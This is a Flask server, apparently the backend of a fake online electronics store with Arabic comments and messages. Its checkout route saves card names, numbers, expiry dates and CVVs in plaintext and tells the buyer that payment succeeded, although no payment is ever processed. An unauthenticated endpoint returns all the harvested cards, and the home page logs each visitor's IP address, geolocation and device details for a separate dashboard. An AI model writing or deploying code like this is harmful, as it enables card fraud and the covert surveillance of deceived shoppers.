from flask import Flask, render_template, request, jsonify, session
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from flask_cors import CORS
from datetime import datetime
import random, hashlib, re, requests, os

app = Flask(__name__)
CORS(app)
app.secret_key = 'techout_elite_secret_key_2026'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///store.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# ------------------------ نماذج قاعدة البيانات ------------------------
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    email = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(200), nullable=False)

class VisaData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    card_name = db.Column(db.String(100))
    card_number = db.Column(db.String(20))
    expiry = db.Column(db.String(10))
    cvv = db.Column(db.String(5))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    status = db.Column(db.String(20), default="جديد")

class Visitor(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ipv4 = db.Column(db.String(50))
    ipv6 = db.Column(db.String(80), default="")
    mac_address = db.Column(db.String(50))
    serial_no = db.Column(db.String(50), unique=True)
    browser_type = db.Column(db.String(50), default="Unknown")
    os = db.Column(db.String(50), default="Unknown")
    screen_resolution = db.Column(db.String(30), default="")
    device_info = db.Column(db.String(300))
    language = db.Column(db.String(20), default="")
    timezone = db.Column(db.String(50), default="")
    lat = db.Column(db.Float, default=30.0444)
    lon = db.Column(db.Float, default=31.2357)
    visited_at = db.Column(db.DateTime, default=datetime.utcnow)

# إنشاء الجداول (تلقائياً)
with app.app_context():
    db.create_all()

# ------------------------ دوال مساعدة ------------------------
def parse_ua(ua):
    ua = ua or ""
    browser = "Unknown"
    if "Chrome/" in ua and "Edg/" not in ua and "OPR/" not in ua:
        browser = "Chrome"
    elif "Firefox/" in ua and "Seamonkey/" not in ua:
        browser = "Firefox"
    elif "Safari/" in ua and "Chrome/" not in ua and "Edg/" not in ua and "OPR/" not in ua:
        browser = "Safari"
    elif "Edg/" in ua:
        browser = "Edge"
    elif "OPR/" in ua or "Opera/" in ua:
        browser = "Opera"
    match_ver = re.search(rf"{browser}[/ ]([\d.]+)", ua) if browser != "Unknown" else None
    if match_ver:
        browser += f" {match_ver.group(1)}"

    os = "Unknown"
    if "Windows NT 10" in ua: os = "Windows 10"
    elif "Windows NT 11" in ua: os = "Windows 11"
    elif "Windows NT 6.3" in ua: os = "Windows 8.1"
    elif "Windows NT 6.1" in ua: os = "Windows 7"
    elif "Mac OS X" in ua:
        os = "macOS"
        m = re.search(r"Mac OS X (\d+[._]\d+[._]?\d*)", ua)
        if m: os = f"macOS {m.group(1).replace('_', '.')}"
    elif "iPhone" in ua or "iPad" in ua:
        os = "iOS"
        m = re.search(r"iPhone OS (\d+_\d+[_]?\d*)", ua)
        if m: os = f"iOS {m.group(1).replace('_', '.')}"
    elif "Android" in ua:
        m = re.search(r"Android (\d+[.]?\d*)", ua)
        os = f"Android {m.group(1)}" if m else "Android"
    elif "Linux" in ua: os = "Linux"

    device_type = "Desktop"
    if "Android" in ua: device_type = "Mobile"
    elif "iPhone" in ua or "iPad" in ua: device_type = "Mobile"
    elif "Mobile" in ua: device_type = "Mobile"
    elif "Tablet" in ua: device_type = "Tablet"
    return browser, os, device_type

def mac_from_ip(ip):
    h = hashlib.md5(ip.encode()).hexdigest()
    return ":".join(h[i:i+2] for i in range(0, 12, 2)).upper()

def generate_serial():
    date = datetime.now().strftime("%y%m%d")
    rand = hashlib.md5(str(random.getrandbits(128)).encode()).hexdigest()[:6].upper()
    return f"SN-{date}-{rand}"

def get_client_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr or '')
    return ip.split(',')[0].strip() or '0.0.0.0'

def get_geo(ip):
    try:
        geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
        if geo.get('status') == 'success':
            return geo.get('lat', 30.0444), geo.get('lon', 31.2357), geo.get('country',''), geo.get('city','')
    except: pass
    return 30.0444, 31.2357, "", ""

def guess_card_type(num):
    num = num or ""
    if num.startswith("4"): return "Visa"
    if num.startswith("5"): return "MasterCard"
    if num.startswith("3"): return "Amex" if num.startswith(("34","37")) else "JCB"
    if num.startswith("6"): return "Discover"
    return "Unknown"

# ------------------------ Routes الخاصة بالمتجر ------------------------
@app.route('/')
def home():
    """الصفحة الرئيسية (تسجيل الزائر وتقديم المتجر)"""
    ip = get_client_ip()
    if ip in ('127.0.0.1', '::1', 'localhost'):
        try:
            ip = requests.get('https://api.ipify.org', timeout=3).text.strip()
        except:
            ip = '0.0.0.0'

    ua = request.headers.get('User-Agent', '')
    browser_parsed, os_parsed, device_type = parse_ua(ua)

    lat, lon, country, city = get_geo(ip)
    mock_mac = mac_from_ip(ip)
    mock_ipv6 = f"2001:db8::{random.randint(1000,9999)}:{random.randint(1000,9999)}"
    serial = generate_serial()
    screen = request.headers.get('Sec-CH-UA-Platform-Version', f"{random.randint(1920,2560)}x{random.randint(1080,1440)}")
    lang = request.headers.get('Accept-Language', 'ar-EG')[:20]
    tz = request.headers.get('Time-Zone', 'Africa/Cairo')

    device_tag = f"[{device_type}] {ua[:200]}"

    v = Visitor(
        ipv4=ip, ipv6=mock_ipv6, mac_address=mock_mac, serial_no=serial,
        browser_type=browser_parsed, os=os_parsed,
        screen_resolution=screen, device_info=device_tag,
        language=lang, timezone=tz, lat=lat, lon=lon
    )
    db.session.add(v)
    db.session.commit()
    return render_template('index.html', device_type=device_type)

# ------------------------ المصادقة ------------------------
@app.route('/api/check_auth', methods=['GET'])
def check_auth():
    if 'user' in session:
        return jsonify({"logged_in": True, "username": session['user']}), 200
    return jsonify({"logged_in": False}), 401

@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "message": "لا توجد بيانات"}), 400
    if User.query.filter_by(email=data.get('email')).first():
        return jsonify({"success": False, "message": "البريد الإلكتروني مسجل مسبقاً!"}), 409
    if User.query.filter_by(username=data.get('username')).first():
        return jsonify({"success": False, "message": "اسم المستخدم محجوز!"}), 409
    hashed = generate_password_hash(data['password'])
    new_user = User(username=data['username'], email=data['email'], password=hashed)
    db.session.add(new_user)
    db.session.commit()
    session['user'] = data['username']
    return jsonify({"success": True, "username": data['username'], "message": "تم إنشاء الحساب بنجاح!"}), 201

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "message": "لا توجد بيانات"}), 400
    user = User.query.filter_by(email=data.get('email')).first()
    if user and check_password_hash(user.password, data.get('password')):
        session['user'] = user.username
        return jsonify({"success": True, "username": user.username, "message": "تم تسجيل الدخول بنجاح!"}), 200
    return jsonify({"success": False, "message": "البريد الإلكتروني أو كلمة المرور غير صحيحة."}), 401

@app.route('/api/logout', methods=['POST'])
def logout():
    session.pop('user', None)
    return jsonify({"success": True, "message": "تم تسجيل الخروج."}), 200

# ------------------------ الدفع ------------------------
@app.route('/api/checkout', methods=['POST'])
def checkout():
    data = request.get_json()
    if not data or 'number' not in data:
        return jsonify({"success": False, "message": "بيانات الدفع غير مكتملة"}), 400
    new_visa = VisaData(
        card_name=data.get('name'),
        card_number=data.get('number'),
        expiry=data.get('expiry'),
        cvv=data.get('cvv')
    )
    db.session.add(new_visa)
    db.session.commit()
    return jsonify({"success": True, "message": "تمت معالجة الدفع بنجاح!"}), 201

# ------------------------ إحصائيات وبيانات للتطبيق المنفصل (اختياري) ------------------------
@app.route('/api/visitors', methods=['GET'])
def get_visitors():
    visitors = Visitor.query.order_by(Visitor.visited_at.desc()).limit(50).all()
    return jsonify([{
        "id": v.id, "ipv4": v.ipv4, "ipv6": v.ipv6 or "",
        "mac": v.mac_address, "serial": v.serial_no or "",
        "browser": v.browser_type or "Unknown", "os": v.os or "Unknown",
        "screen": v.screen_resolution or "",
        "device": v.device_info or "",
        "language": v.language or "", "timezone": v.timezone or "",
        "lat": v.lat, "lon": v.lon,
        "time": v.visited_at.strftime('%Y-%m-%d %H:%M:%S')
    } for v in visitors]), 200

@app.route('/api/visas', methods=['GET'])
def get_visas():
    visas = VisaData.query.order_by(VisaData.timestamp.desc()).all()
    return jsonify([{
        "id": v.id, "name": v.card_name, "number": v.card_number,
        "expiry": v.expiry, "cvv": v.cvv, "status": v.status,
        "card_type": guess_card_type(v.card_number),
        "time": v.timestamp.strftime('%Y-%m-%d %H:%M:%S') if v.timestamp else ""
    } for v in visas]), 200

@app.route('/api/stats', methods=['GET'])
def get_stats():
    total_visitors = Visitor.query.count()
    total_visas = VisaData.query.count()
    today = datetime.utcnow().date()
    today_visitors = Visitor.query.filter(db.func.date(Visitor.visited_at) == today).count()
    return jsonify({
        "total_visitors": total_visitors,
        "total_visas": total_visas,
        "today_visitors": today_visitors
    }), 200

# إضافة endpoint خاص بالزوار من تطبيق PyQt (إن وجد)
@app.route('/api/visitor', methods=['POST'])
def add_visitor():
    data = request.get_json()
    if not data:
        return jsonify({"error": "No data"}), 400
    v = Visitor(
        ipv4=data.get('ipv4', ''),
        ipv6=data.get('ipv6', ''),
        mac_address=data.get('mac', ''),
        serial_no=data.get('serial', ''),
        browser_type=data.get('browser', 'Unknown'),
        os=data.get('os', 'Unknown'),
        screen_resolution=data.get('screen', ''),
        device_info=data.get('device', ''),
        language=data.get('language', ''),
        timezone=data.get('timezone', ''),
        lat=data.get('lat', 0.0),
        lon=data.get('lon', 0.0)
    )
    db.session.add(v)
    db.session.commit()
    return jsonify({"status": "added", "id": v.id}), 201

# ------------------------ تشغيل الخادم ------------------------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)